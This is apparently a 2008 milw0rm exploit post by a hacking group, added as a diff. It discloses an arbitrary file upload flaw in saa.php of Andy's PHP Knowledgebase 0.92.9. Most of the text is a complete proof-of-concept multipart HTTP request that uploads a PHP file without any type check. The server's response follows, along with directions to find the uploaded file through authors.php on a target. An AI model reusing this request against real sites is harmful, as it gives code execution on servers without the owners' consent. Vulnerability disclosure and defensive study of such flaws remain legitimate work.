@@ -1,0 +1,115 @@
+==============================================================
+ Andy's PHP Knowledgebase Arbitrary File Upload Vulnerability
+==============================================================
+
+  ,--^----------,--------,-----,-------^--,
+  | |||||||||   `--------'     |          O	.. CWH Underground Hacking Team ..
+  `+---------------------------^----------|
+    `\_,-------, _________________________|
+      / XXXXXX /`|     /
+     / XXXXXX /  `\   /
+    / XXXXXX /\______(
+   / XXXXXX /           
+  / XXXXXX /
+ (________(             
+  `------'
+
+
+AUTHOR : CWH Underground
+DATE   : 1 December 2008
+SITE   : cwh.citec.us
+
+
+#####################################################
+APPLICATION : Andy's PHP Knowledgebase
+VERSION     : 0.92.9
+DOWNLOAD    : http://sourceforge.net/project/showfiles.php?group_id=113755
+#####################################################
+
+--- Arbitrary File Upload ---
+
+In saa.php page, you can submit an article and attachment file to wait for approval from admin.
+Immediately after you submit the article and attachment file, the file has already been on the server without checking file type.
+You can upload arbitary file through this form and the url to this file is in authors.php page.
+
+--------
+  POC
+--------
+
+POST /cms/aphpkb/saa.php HTTP/1.1
+Host: 127.0.0.1
+User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.18) Gecko/20081029 Firefox/2.0.0.18
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+Accept-Language: en-us,en;q=0.5
+Accept-Encoding: gzip,deflate
+Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
+Keep-Alive: 300
+Connection: keep-alive
+Referer: http://127.0.0.1/cms/aphpkb/saa.php?aid=2
+Cookie: module=table; PHPSESSID=b311c4f9b1f3ee0c071f33ffd3b3176f
+Content-Type: multipart/form-data; boundary=---------------------------22955284022147
+Content-Length: 1080
+-----------------------------22955284022147
+Content-Disposition: form-data; name="title"
+
+PoC Arbitrary File Upload
+-----------------------------22955284022147
+Content-Disposition: form-data; name="article"
+
+PoC Arbitrary File Upload
+-----------------------------22955284022147
+Content-Disposition: form-data; name="keywords"
+
+PoC Arbitrary File Upload
+-----------------------------22955284022147
+Content-Disposition: form-data; name="aid"
+
+2
+-----------------------------22955284022147
+Content-Disposition: form-data; name="upload"; filename="info.php"
+Content-Type: application/octet-stream
+
+<? phpinfo(); ?>
+-----------------------------22955284022147
+Content-Disposition: form-data; name="description"
+
+PHP File
+-----------------------------22955284022147
+Content-Disposition: form-data; name="aid"
+
+2
+-----------------------------22955284022147
+Content-Disposition: form-data; name="a"
+
+
+-----------------------------22955284022147
+Content-Disposition: form-data; name="submit"
+
+Submit/Save
+-----------------------------22955284022147--
+
+
+HTTP/1.x 200 OK
+Date: Mon, 01 Dec 2008 05:39:35 GMT
+Server: Apache/2.2.8 (Win32) PHP/5.2.6
+X-Powered-By: PHP/5.2.6
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
+Pragma: no-cache
+Content-Length: 4578
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Content-Type: text/html
+
+
+-----------------------------------------------------------------------
+
+Link for uploaded file is in http://[Target]/[aphpkb_path]/authors.php
+
+
+#######################################################################################
+Greetz      : ZeQ3uL, BAD $ectors, Snapter, Conan, JabAv0C, Win7dos, Gdiupo, GnuKDE, JK
+Special Thx : asylu3, str0ke, citec.us, milw0rm.com
+#######################################################################################
+
+# milw0rm.com [2008-12-01]
